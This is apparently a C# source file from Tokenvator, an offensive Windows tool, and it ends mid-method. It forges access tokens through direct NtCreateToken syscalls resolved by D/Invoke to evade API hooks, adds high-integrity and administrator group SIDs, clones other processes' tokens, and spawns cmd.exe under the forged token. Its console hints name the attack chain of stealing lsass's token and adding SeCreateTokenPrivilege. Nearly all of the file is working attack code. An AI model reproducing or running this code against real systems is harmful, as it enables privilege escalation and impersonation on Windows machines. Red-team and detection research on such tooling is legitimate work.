using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

using DInvoke.DynamicInvoke;
using DInvoke.ManualMap;
using DInvoke.Data;

using Tokenvator.Resources;
using Tokenvator.Plugins.Enumeration;

using MonkeyWorks.Unmanaged.Headers;
using System.Runtime.ExceptionServices;
using System.Security;
using MonkeyWorks.Unmanaged.Libraries;

namespace Tokenvator.Plugins.AccessTokens
{
    using MonkeyWorks = MonkeyWorks.Unmanaged.Libraries.DInvoke;

    //https://stackoverflow.com/questions/21716527/in-windows-how-do-you-programatically-launch-a-process-in-administrator-mode-un/21718198#21718198

    class CreateTokens : AccessTokens
    {
        private bool ctDisposed = false;

        private uint localEntriesRead = 0;
        private uint localTotalEntriesRead = 0;

        private uint globalEntriesRead = 0;
        private uint globalEotalEntriesRead = 0;

        private int extraGroups = 0;

        private IntPtr hSecurityContextTrackingMode;

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Default Constructor
        /// </summary>
        /// <param name="token"></param>
        ////////////////////////////////////////////////////////////////////////////////
        public CreateTokens(IntPtr token) : base(token)
        {
            SetWorkingTokenToSelf();
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Default destructor
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        ~CreateTokens()
        {
            if (!ctDisposed)
            {
                Dispose();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// IDisposable to free the allocated pointers
        /// </summary>
        ////////////////////////////////////////////////////////////////////////////////
        public override void Dispose()
        {
            ctDisposed = true;

            if (IntPtr.Zero != hSecurityContextTrackingMode)
            {
                Marshal.FreeHGlobal(hSecurityContextTrackingMode);
            }

            base.Dispose();
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Creates a duplicate of the currently calling token
        /// Converted to D/Invoke Syscalls
        /// </summary>
        /// <param name="command"></param>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public void CreateToken(string command)
        {
            if (!_CheckPrivileges())
            {
                return;
            }

            Console.WriteLine();
            Console.WriteLine("_SECURITY_QUALITY_OF_SERVICE");
            Winnt._SECURITY_QUALITY_OF_SERVICE securityContextTrackingMode = new Winnt._SECURITY_QUALITY_OF_SERVICE()
            {
                Length = (uint)Marshal.SizeOf(typeof(Winnt._SECURITY_QUALITY_OF_SERVICE)),
                ImpersonationLevel = Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                ContextTrackingMode = Winnt.SECURITY_CONTEXT_TRACKING_MODE.SECURITY_STATIC_TRACKING,
                EffectiveOnly = Winnt.EFFECTIVE_ONLY.False
            };

            hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
            Marshal.StructureToPtr(securityContextTrackingMode, hSecurityContextTrackingMode, false);

            Console.WriteLine("_OBJECT_ATTRIBUTES");
            wudfwdm._OBJECT_ATTRIBUTES objectAttributes = new wudfwdm._OBJECT_ATTRIBUTES()
            {
                Length = (uint)Marshal.SizeOf(typeof(wudfwdm._OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                Attributes = 0,
                ObjectName = IntPtr.Zero,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = hSecurityContextTrackingMode
            };

            uint ntRetVal = 0;
            using (TokenInformation ti = new TokenInformation(hWorkingToken))
            {
                ti.SetWorkingTokenToSelf();

                ti.GetTokenSource();
                ti.GetTokenUser();
                ti.GetTokenGroups();
                ti.GetTokenPrivileges();
                ti.GetTokenOwner();
                ti.GetTokenPrimaryGroup();
                ti.GetTokenDefaultDacl();

                Winnt._LUID systemLuid = Winnt.SYSTEM_LUID;
                long expirationTime = long.MaxValue / 2;

                phNewToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));

                IntPtr hNtCreateToken = Generic.GetSyscallStub("NtCreateToken");
                MonkeyWorks.ntdll.NtCreateToken fSyscallNtCreateToken = (MonkeyWorks.ntdll.NtCreateToken)Marshal.GetDelegateForFunctionPointer(hNtCreateToken, typeof(MonkeyWorks.ntdll.NtCreateToken));

                try
                {
                    ntRetVal = fSyscallNtCreateToken(
                        out phNewToken,
                        Winnt.TOKEN_ALL_ACCESS,
                        ref objectAttributes,
                        Winnt._TOKEN_TYPE.TokenPrimary,
                        ref systemLuid,
                        ref expirationTime,
                        ref ti.tokenUser,
                        ref ti.tokenGroups,
                        ref ti.tokenPrivileges,
                        ref ti.tokenOwner,
                        ref ti.tokenPrimaryGroup,
                        ref ti.tokenDefaultDacl,
                        ref ti.tokenSource
                    );
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] NtCreateToken Generated an Exception");
                    Console.WriteLine(ex.Message);
                }
            }

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtCreateToken", ntRetVal);
                new TokenInformation(phNewToken).GetTokenUser();
            }

            if (string.IsNullOrEmpty(command))
            {
                command = "cmd.exe";
            }

            SetWorkingTokenToNewToken();
            StartProcessAsUser(command);
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Creates a token from scratch with additinal groups allowed
        /// Converted to D/Invoke Syscalls
        /// </summary>
        /// <param name="command"></param>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public void CreateToken(string userName, string[] groups, string command)
        {
            Console.WriteLine("[*] Creating Token for {0}", userName);

            if (!_CheckPrivileges())
            {
                return;
            }

            #region _OBJECT_ATTRIBUTES
            Console.WriteLine();
            Console.WriteLine("[*] _SECURITY_QUALITY_OF_SERVICE");
            Winnt._SECURITY_QUALITY_OF_SERVICE securityContextTrackingMode = new Winnt._SECURITY_QUALITY_OF_SERVICE()
            {
                Length = (uint)Marshal.SizeOf(typeof(Winnt._SECURITY_QUALITY_OF_SERVICE)),
                ImpersonationLevel = Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,//SecurityAnonymous
                ContextTrackingMode = Winnt.SECURITY_CONTEXT_TRACKING_MODE.SECURITY_STATIC_TRACKING,
                EffectiveOnly = Winnt.EFFECTIVE_ONLY.False
            };

            hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
            Marshal.StructureToPtr(securityContextTrackingMode, hSecurityContextTrackingMode, false);

            Console.WriteLine("[*] _OBJECT_ATTRIBUTES");
            wudfwdm._OBJECT_ATTRIBUTES objectAttributes = new wudfwdm._OBJECT_ATTRIBUTES()
            {
                Length = (uint)Marshal.SizeOf(typeof(wudfwdm._OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                Attributes = 0,
                ObjectName = IntPtr.Zero,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = hSecurityContextTrackingMode
            };
            #endregion

            string domain = string.Empty;
            if (userName.Contains(@"\"))
            {
                string[] split = userName.Split('\\');
                domain = split[0];
                userName = split[1];
            }

            Winnt._LUID systemLuid = Winnt.SYSTEM_LUID;
            long expirationTime = long.MaxValue / 2;
            Ntifs._TOKEN_USER tokenUser;
            CreateTokenUser(domain, userName, out tokenUser);

            Ntifs._TOKEN_GROUPS tokenGroups;
            Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup;
            CreateTokenGroups(domain, userName, out tokenGroups, out tokenPrimaryGroup, groups);

            Winnt._TOKEN_PRIVILEGES_ARRAY tokenPrivileges;
            CreateTokenPrivileges(tokenUser, tokenGroups, out tokenPrivileges);

            Ntifs._TOKEN_OWNER tokenOwner;
            CreateTokenOwner(domain, userName, out tokenOwner);

            Winnt._TOKEN_DEFAULT_DACL tokenDefaultDacl;
            CreateTokenDefaultDACL(out tokenDefaultDacl);

            Winnt._TOKEN_SOURCE tokenSource;
            CreateTokenSource(out tokenSource);

            phNewToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));

            IntPtr hNtCreateToken = Generic.GetSyscallStub("NtCreateToken");
            MonkeyWorks.ntdll.NtCreateToken fSyscallNtCreateToken = (MonkeyWorks.ntdll.NtCreateToken)Marshal.GetDelegateForFunctionPointer(hNtCreateToken, typeof(MonkeyWorks.ntdll.NtCreateToken));

            uint ntRetVal = 0;
            try
            {
                ntRetVal = fSyscallNtCreateToken(
                    out phNewToken,
                    Winnt.TOKEN_ALL_ACCESS,
                    ref objectAttributes,
                    Winnt._TOKEN_TYPE.TokenPrimary,
                    ref systemLuid,
                    ref expirationTime,
                    ref tokenUser,
                    ref tokenGroups,
                    ref tokenPrivileges,
                    ref tokenOwner,
                    ref tokenPrimaryGroup,
                    ref tokenDefaultDacl,
                    ref tokenSource
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] NtCreateToken Generated an Exception");
                Console.WriteLine(ex.Message);
            }

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtCreateToken", ntRetVal);
                return;
            }

            Console.WriteLine();

            using (DesktopACL desktop = new DesktopACL())
            {
                desktop.OpenDesktop();
                desktop.OpenWindow();
            }

            Console.WriteLine();

            if (string.IsNullOrEmpty(command))
            {
                command = "cmd.exe";
            }

            SetWorkingTokenToNewToken();
            StartProcessAsUser(command);
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Clones a remote access token to create a process off of it
        /// Converted to D/Invoke Syscalls
        /// </summary>
        /// <param name="command"></param>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        public void CloneToken(int processId, string command)
        {
            if (!_CheckPrivileges())
            {
                return;
            }

            Console.WriteLine();
            Console.WriteLine("_SECURITY_QUALITY_OF_SERVICE");
            Winnt._SECURITY_QUALITY_OF_SERVICE securityContextTrackingMode = new Winnt._SECURITY_QUALITY_OF_SERVICE()
            {
                Length = (uint)Marshal.SizeOf(typeof(Winnt._SECURITY_QUALITY_OF_SERVICE)),
                ImpersonationLevel = Winnt._SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                ContextTrackingMode = Winnt.SECURITY_CONTEXT_TRACKING_MODE.SECURITY_STATIC_TRACKING,
                EffectiveOnly = Winnt.EFFECTIVE_ONLY.False
            };

            hSecurityContextTrackingMode = Marshal.AllocHGlobal(Marshal.SizeOf(securityContextTrackingMode));
            Marshal.StructureToPtr(securityContextTrackingMode, hSecurityContextTrackingMode, false);

            Console.WriteLine("_OBJECT_ATTRIBUTES");
            wudfwdm._OBJECT_ATTRIBUTES objectAttributes = new wudfwdm._OBJECT_ATTRIBUTES()
            {
                Length = (uint)Marshal.SizeOf(typeof(wudfwdm._OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                Attributes = 0,
                ObjectName = IntPtr.Zero,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = hSecurityContextTrackingMode
            };

            uint ntRetVal = 0;
            using (TokenInformation ti = new TokenInformation(hWorkingToken))
            {
                ti.OpenProcessToken(processId);
                ti.SetWorkingTokenToRemote();

                ti.GetTokenSource();
                ti.GetTokenUser();
                ti.GetTokenGroups();
                ti.GetTokenPrivileges();
                ti.GetTokenOwner();
                ti.GetTokenPrimaryGroup();
                ti.GetTokenDefaultDacl();

                Winnt._LUID systemLuid = Winnt.SYSTEM_LUID;
                long expirationTime = long.MaxValue / 2;

                phNewToken = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));

                IntPtr hNtCreateToken = Generic.GetSyscallStub("NtCreateToken");
                MonkeyWorks.ntdll.NtCreateToken fSyscallNtCreateToken = (MonkeyWorks.ntdll.NtCreateToken)Marshal.GetDelegateForFunctionPointer(hNtCreateToken, typeof(MonkeyWorks.ntdll.NtCreateToken));

                ntRetVal = fSyscallNtCreateToken(
                    out phNewToken,
                    Winnt.TOKEN_ALL_ACCESS,
                    ref objectAttributes,
                    Winnt._TOKEN_TYPE.TokenPrimary,
                    ref systemLuid,
                    ref expirationTime,
                    ref ti.tokenUser,
                    ref ti.tokenGroups,
                    ref ti.tokenPrivileges,
                    ref ti.tokenOwner,
                    ref ti.tokenPrimaryGroup,
                    ref ti.tokenDefaultDacl,
                    ref ti.tokenSource
                );
            }

            if (0 != ntRetVal)
            {
                Misc.GetNtError("NtCreateToken", ntRetVal);
                return;
            }

            if (string.IsNullOrEmpty(command))
            {
                command = "cmd.exe";
            }

            using (DesktopACL desktop = new DesktopACL())
            {
                desktop.OpenDesktop();
                desktop.OpenWindow();
            }

            SetWorkingTokenToNewToken();
            StartProcessAsUser(command);
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Checks if SeCreateTokenPrivilege & SeSecurityPrivilege is present and enabled 
        /// on the token if it present but not enabled on the token, it is automatically 
        /// enabled
        /// </summary>
        /// <param name="command"></param>
        ////////////////////////////////////////////////////////////////////////////////
        private bool _CheckPrivileges()
        {
            bool exists, enabled;

            using (TokenInformation ti = new TokenInformation(hWorkingToken))
            {
                ti.SetWorkingTokenToSelf();

                ////////////////////////////////////////////////////////////////////////////////
                // Checks if SeCreateTokenPrivilege is present and enabled on the token
                // if it present but not enabled on the token, it is automatically enabled
                ////////////////////////////////////////////////////////////////////////////////
                if (!ti.CheckTokenPrivilege(Winnt.SE_CREATETOKEN_NAME, out exists, out enabled))
                {
                    Console.WriteLine("[-] Check Token Privilege Failed");
                    return false;
                }
                if (!exists)
                {
                    Console.WriteLine("[-] {0} is not present on the token", Winnt.SE_CREATETOKEN_NAME);
                    Console.WriteLine("[-] Steal_Token lsass cmd.exe");
                    Console.WriteLine("[-] Add_Privilege SeCreateTokenPrivilege");
                    return false;
                }
                if (!enabled)
                {
                    Console.WriteLine("[-] {0} is not enabled on the token", Winnt.SE_CREATETOKEN_NAME);
                    Console.WriteLine("[*] Enabling {0} on the token", Winnt.SE_CREATETOKEN_NAME);
                    using (TokenManipulation tm = new TokenManipulation(hWorkingToken))
                    {
                        tm.SetWorkingTokenToSelf();
                        if (!tm.SetTokenPrivilege(Winnt.SE_CREATETOKEN_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
                        {
                            return false;
                        }
                    }
                }
                else
                {
                    Console.WriteLine("[+] {0} is present and enabled on the token", Winnt.SE_CREATETOKEN_NAME);
                }

                ////////////////////////////////////////////////////////////////////////////////
                // Checks if SeSecurityPrivilege is present and enabled on the token
                // if it present but not enabled on the token, it is automatically enabled
                ////////////////////////////////////////////////////////////////////////////////
                if (!ti.CheckTokenPrivilege(Winnt.SE_SECURITY_NAME, out exists, out enabled))
                {
                    Console.WriteLine("[-] Check Token Privilege Failed");
                    return false;
                }
                if (!exists)
                {
                    Console.WriteLine("[-] {0} is not present on the token", Winnt.SE_SECURITY_NAME);
                    Console.WriteLine("[-] This should be present on existing high integrity tokens");
                    Console.WriteLine("[-] Add_Privilege SeCreateTokenPrivilege");
                    return false;
                }
                if (!enabled)
                {
                    Console.WriteLine("[-] {0} is not enabled on the token", Winnt.SE_SECURITY_NAME);
                    Console.WriteLine("[*] Enabling {0} on the token", Winnt.SE_SECURITY_NAME);
                    using (TokenManipulation tm = new TokenManipulation(hWorkingToken))
                    {
                        tm.SetWorkingTokenToSelf();
                        if (!tm.SetTokenPrivilege(Winnt.SE_SECURITY_NAME, Winnt.TokenPrivileges.SE_PRIVILEGE_ENABLED))
                        {
                            return false;
                        }
                    }
                }
                else
                {
                    Console.WriteLine("[+] {0} is present and enabled on the token", Winnt.SE_CREATETOKEN_NAME);
                }
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Creates the TOKEN_USER Structure
        /// No Conversions Required
        /// enabled
        /// </summary>
        /// <param name="command"></param>
        ////////////////////////////////////////////////////////////////////////////////
        private bool CreateTokenUser(string domain, string userName, out Ntifs._TOKEN_USER tokenUser)
        {
            Console.WriteLine("[*] Creating _TOKEN_USER");
            tokenUser = new Ntifs._TOKEN_USER();
            IntPtr hUserSid = IntPtr.Zero;
            if (!_LookupSid(domain, userName, ref hUserSid))
            {
                return false;
            }
            tokenUser.User.Sid = hUserSid;
            tokenUser.User.Attributes = 0;

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Creates the TOKEN_GROUPS Structure
        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="command"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        internal bool CreateTokenGroups(string domain, string userName, out Ntifs._TOKEN_GROUPS tokenGroups, out Winnt._TOKEN_PRIMARY_GROUP tokenPrimaryGroup, string[] groups)
        {
            Console.WriteLine("[*] _TOKEN_GROUPS");

            tokenGroups = new Ntifs._TOKEN_GROUPS();
            tokenGroups.Initialize();
            tokenPrimaryGroup = new Winnt._TOKEN_PRIMARY_GROUP();

            uint LG_INCLUDE_INDIRECT = 0x0001;

            ////////////////////////////////////////////////////////////////////////////////
            // hnetapi32 = kernel32.LoadLibrary("netapi32.dll");
            ////////////////////////////////////////////////////////////////////////////////
            IntPtr hnetapi32 = Generic.GetPebLdrModuleEntry("netapi32.dll");
            if (IntPtr.Zero == hnetapi32)
            {
                hnetapi32 = Generic.LoadModuleFromDisk("netapi32.dll");
                if (IntPtr.Zero == hnetapi32)
                {
                    Console.WriteLine("Unable to load netapi32.dll");
                    return false;
                }
            }

            ////////////////////////////////////////////////////////////////////////////////
            // GetExportAddress was returning the wrong address for NetUserGetLocalGroups
            // Using Kernel32.GetProcAddress which was returning the correct address
            // IntPtr hNetUserGetLocalGroups2 = kernel32.GetProcAddress(hnetapi32, "NetUserGetLocalGroups");
            ////////////////////////////////////////////////////////////////////////////////
            IntPtr hkernel32 = Generic.GetPebLdrModuleEntry("kernel32.dll");
            IntPtr hGetProcAddress = Generic.GetExportAddress(hkernel32, "GetProcAddress");
            MonkeyWorks.kernel32.GetProcAddress fGetProcAddress = (MonkeyWorks.kernel32.GetProcAddress)Marshal.GetDelegateForFunctionPointer(hGetProcAddress, typeof(MonkeyWorks.kernel32.GetProcAddress));            
    
            #region NetUserGetLocalGroups       
            IntPtr hNetUserGetLocalGroups = IntPtr.Zero;
            try
            {
                hNetUserGetLocalGroups = fGetProcAddress(hnetapi32, "NetUserGetLocalGroups");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] GetProcAddress Generated an Exception");
                Console.WriteLine(ex.Message);
            }

            /*
            byte[] bytes = System.IO.File.ReadAllBytes(@"C:\Windows\System32\netapi32.dll");
            PE.PE_MANUAL_MAP ManMapTest3 = Map.MapModuleToMemory(bytes);
            Generic.CallMappedDLLModule(ManMapTest3.PEINFO, ManMapTest3.ModuleBase);
            hNetUserGetLocalGroups = Generic.GetExportAddress(hnetapi32, 240);
            fNetUserGetLocalGroups = (MonkeyWorks.netapi32.NetUserGetLocalGroups)Marshal.GetDelegateForFunctionPointer(hNetUserGetLocalGroups, typeof(MonkeyWorks.netapi32.NetUserGetLocalGroups));
            */

            ////////////////////////////////////////////////////////////////////////////////
            // This failed hard with directly calling GetExportAddress against hnetapi32
            // ntRetVal = netapi32.NetUserGetLocalGroups(domain, userName.ToLower(), 0, LG_INCLUDE_INDIRECT, out bufPtr, -1, ref localEntriesRead, ref localTotalEntriesRead);
            ////////////////////////////////////////////////////////////////////////////////
            lmaccess._LOCALGROUP_USERS_INFO_0[] localgroupUserInfo;
            IntPtr bufPtr = IntPtr.Zero;

            MonkeyWorks.netapi32.NetUserGetLocalGroups fNetUserGetLocalGroups = (MonkeyWorks.netapi32.NetUserGetLocalGroups)Marshal.GetDelegateForFunctionPointer(hNetUserGetLocalGroups, typeof(MonkeyWorks.netapi32.NetUserGetLocalGroups));

            uint netRetVal = 0;
            try
            {
                netRetVal = fNetUserGetLocalGroups(
                    ref domain,
                    ref userName,
                    0,
                    LG_INCLUDE_INDIRECT,
                    out bufPtr,
                    -1,
                    ref localEntriesRead,
                    ref localTotalEntriesRead
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] NetUserGetLocalGroups Generated an Exception");
                Console.WriteLine(ex);
            }

            if (0 != netRetVal)
            {
                Misc.GetNetApiError("NetUserGetLocalGroups", netRetVal);

            }

            localgroupUserInfo = new lmaccess._LOCALGROUP_USERS_INFO_0[localEntriesRead];

            Console.WriteLine("[+] Local Groups: {0}", localEntriesRead);

            for (int i = 0; i < localEntriesRead; i++)
            {
                try
                {
                    var itemPtr = new IntPtr(bufPtr.ToInt64() + (Marshal.SizeOf(typeof(lmaccess._LOCALGROUP_USERS_INFO_0)) * i));
                    localgroupUserInfo[i] = (lmaccess._LOCALGROUP_USERS_INFO_0)Marshal.PtrToStructure(itemPtr, typeof(lmaccess._LOCALGROUP_USERS_INFO_0));
                    Console.WriteLine(" [+] {0}", localgroupUserInfo[i].lgrui0_name);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] PtrToStructure Generated an Exception");
                    Console.WriteLine(ex.Message);
                }
            }
            #endregion

            #region NetUserGetGroups
            ////////////////////////////////////////////////////////////////////////////////
            //netapi32.NetUserGetGroups(domain, userName.ToLower(), 0, out bufPtr, -1, ref globalEntriesRead, ref globalEotalEntriesRead);
            ////////////////////////////////////////////////////////////////////////////////
            IntPtr hNetUserGetGroups = Generic.GetExportAddress(hnetapi32, "NetUserGetGroups");
            MonkeyWorks.netapi32.NetUserGetGroups fNetUserGetGroups = (MonkeyWorks.netapi32.NetUserGetGroups)Marshal.GetDelegateForFunctionPointer(hNetUserGetGroups, typeof(MonkeyWorks.netapi32.NetUserGetGroups));

            lmaccess._GROUP_USERS_INFO_0[] globalGroupUserInfo;
            try
            {
                netRetVal = netapi32.NetUserGetGroups(
                    domain,
                    userName.ToLower(),
                    0,
                    out bufPtr,
                    -1,
                    ref globalEntriesRead,
                    ref globalEotalEntriesRead
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] NetUserGetGroups Generated an Exception");
                Console.WriteLine(ex.Message);
            }

            if (0 != netRetVal)
            {
                Misc.GetNetApiError("NetUserGetGroups", netRetVal);
            }

            globalGroupUserInfo = new lmaccess._GROUP_USERS_INFO_0[globalEntriesRead];

            Console.WriteLine("[+] Global Groups: {0}", globalEntriesRead);

            for (int i = 0; i < localEntriesRead; i++)
            {
                try
                {
                    var itemPtr = new IntPtr(bufPtr.ToInt64() + (Marshal.SizeOf(typeof(lmaccess._GROUP_USERS_INFO_0)) * i));
                    globalGroupUserInfo[i] = (lmaccess._GROUP_USERS_INFO_0)Marshal.PtrToStructure(itemPtr, typeof(lmaccess._GROUP_USERS_INFO_0));
                    Console.WriteLine(" [+] {0}", globalGroupUserInfo[i].grui0_name);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] PtrToStructure Generated an Exception");
                    Console.WriteLine(ex.Message);
                }
            }
            #endregion

            #region Default Admin Entries

            uint groupsAttributes = (uint)(Winnt.SE_GROUP_ENABLED | Winnt.SE_GROUP_ENABLED_BY_DEFAULT | Winnt.SE_GROUP_MANDATORY);

            /*
             * This works, but don't do it this way
            //Everyone
            _InitializeSid(Winnt.SECURITY_WORLD_SID_AUTHORITY, new uint[] { 0, 0, 0, 0, 0, 0, 0, 0 }, ref tokenGroups.Groups[0].Sid);
            tokenGroups.Groups[0].Attributes = groupsAttributes;
            */

            //Console.WriteLine("[+] Extra Groups");
            //Everyone
            InitializeSid("S-1-1-0", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //Administrators - Make this a flag
            InitializeSid("S-1-5-114", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //INTERACTIVE
            InitializeSid("S-1-5-4", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //CONSOLE LOGON
            InitializeSid("S-1-2-1", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //Authenticated Users
            InitializeSid("S-1-5-11", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //This Organization
            InitializeSid("S-1-5-15", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //Local account
            InitializeSid("S-1-5-113", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //LOCAL
            InitializeSid("S-1-2-0", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //NTLM Authentication
            InitializeSid("S-1-5-64-10", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;

            //High Integrity Token
            InitializeSid("S-1-16-12288", ref tokenGroups.Groups[extraGroups].Sid);
            tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
            #endregion

            #region Custom Groups
            //Custom groups
            foreach (string group in groups)
            {
                string d = Environment.MachineName;
                string groupname = group;
                if (group.Contains(@"\"))
                {
                    string[] split = group.Split('\\');
                    d = split[0];
                    groupname = split[1];
                }
                string sid = new NTAccount(d, groupname).Translate(typeof(SecurityIdentifier)).Value;
                InitializeSid(sid, ref tokenGroups.Groups[extraGroups].Sid);
                tokenGroups.Groups[extraGroups++].Attributes = groupsAttributes;
            }
            #endregion

            #region Local & Global Entries
            for (int i = 0; i < localEntriesRead; i++)
            {
                int offset = i + extraGroups;
                //Console.WriteLine("[*] Adding: {0}", localgroupUserInfo[i].lgrui0_name);
                if (!_LookupSid(string.Empty, localgroupUserInfo[i].lgrui0_name, ref tokenGroups.Groups[offset].Sid))
                {
                    return false;
                }
                tokenGroups.Groups[offset].Attributes = groupsAttributes;
            }

            for (int i = 0; i < globalEntriesRead; i++)
            {
                int offset = i + extraGroups + (int)localEntriesRead;
                //Console.WriteLine("[*] Adding: {0}", globalGroupUserInfo[i].grui0_name);
                if (!_LookupSid(string.Empty, globalGroupUserInfo[i].grui0_name, ref tokenGroups.Groups[offset].Sid))
                {
                    return false;
                }
                if (0 == i)
                {
                    tokenPrimaryGroup.PrimaryGroup = tokenGroups.Groups[offset].Sid;
                }

                tokenGroups.Groups[offset].Attributes = groupsAttributes;
            }
            #endregion

            tokenGroups.GroupCount = (int)(localEntriesRead + globalEntriesRead + extraGroups);

            Console.WriteLine("[*] Adding Groups");

            for (int i = 0; i < tokenGroups.GroupCount; i++)
            {
                string sid, account;
                TokenInformation.ReadSidAndName(tokenGroups.Groups[i].Sid, out sid, out account);
                Console.WriteLine(" ({0}) {1,-20} {2}", i, sid, account);
            }

            return true;
        }

        ////////////////////////////////////////////////////////////////////////////////
        /// <summary>
        /// Creates the TOKEN_PRIVILEGES Structure
        /// Converted to D/Invoke GetPebLdrModuleEntry/GetExportAddress
        /// </summary>
        /// <param name="tokenUser"></param>
        /// <param name="tokenGroups"></param>
        /// <param name="tokenPrivileges"></param>
        /// <returns></returns>
        ////////////////////////////////////////////////////////////////////////////////
        [SecurityCritical]
        [HandleProcessCorruptedStateExceptions]
        private bool CreateTokenPrivileges(Ntifs._TOKEN_USER tokenUser, Ntifs._TOKEN_GROUPS tokenGroups, out Winnt._TOKEN_PRIVILEGES_ARRAY tokenPrivileges)
        {
            Console.WriteLine("[*] _TOKEN_PRIVILEGES");

            IntPtr hadvapi32 = Generic.GetPebLdrModuleEntry("advapi32.dll");
            IntPtr hLsaOpenPolicy = Generic.GetExportAddress(hadvapi32, "LsaOpenPolicy");
            MonkeyWorks.advapi32.LsaOpenPolicy fLsaOpenPolicy = (MonkeyWorks.advapi32.LsaOpenPolicy)Marshal.GetDelegateForFunctionPointer(hLsaOpenPolicy, typeof(MonkeyWorks.advapi32.LsaOpenPolicy));

            tokenPrivileges = new Winnt._TOKEN_PRIVILEGES_ARRAY();
            ntsecapi._LSA_UNICODE_STRING systemName = new ntsecapi._LSA_UNICODE_STRING();
            lsalookup._LSA_OBJECT_ATTRIBUTES lsaobjectAttributes = new lsalookup._LSA_OBJECT_ATTRIBUTES()
            {
                Length = (uint)Marshal.SizeOf(typeof(lsalookup._LSA_OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                ObjectName = new ntsecapi._LSA_UNICODE_STRING(),
                Attributes = 0,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };
            IntPtr hPolicyHandle = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(IntPtr)));

            ////////////////////////////////////////////////////////////////////////////////
            // advapi32.LsaOpenPolicy(ref systemName, ref lsaobjectAttributes, (uint)lsalookup.LSA_ACCESS_MASK.POLICY_ALL_ACCESS, out hPolicyHandle);
            ////////////////////////////////////////////////////////////////////////////////
            uint ntRetVal = 0;
            try
            {
                ntRetVal = fLsaOpenPolicy(
                    ref systemName,
                    ref lsaobjectAttributes,
                    (uint)lsalookup.LSA_ACCESS_MASK.POLICY_ALL_ACCESS,
                    ref hPolicyHandle
                );
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] LsaOpenPolicy Generated an Exception");
                Console.WriteLine("[-] {0}", ex.Message);
                return false;
            }

            if (0 != ntRetVal || IntPtr.Zero == hPolicyHandle)
            {
                Misc.GetNtError("LsaOpenPolicy", ntRetVal);
                return false;
            }

            Dictionary<string, Winnt._LUID> rights = new Dictionary<string, Winnt._LUID>();

            _LookupRights(hPolicyHandle, tokenUser.User.Sid, ref rights);
            for (int i = 0; i < extraGroups + localEntriesRead + globalEntriesRead; i++)
            {
                _LookupRights(hPolicyHandle, tokenGroups.Groups[i].Sid, ref rights);
            }

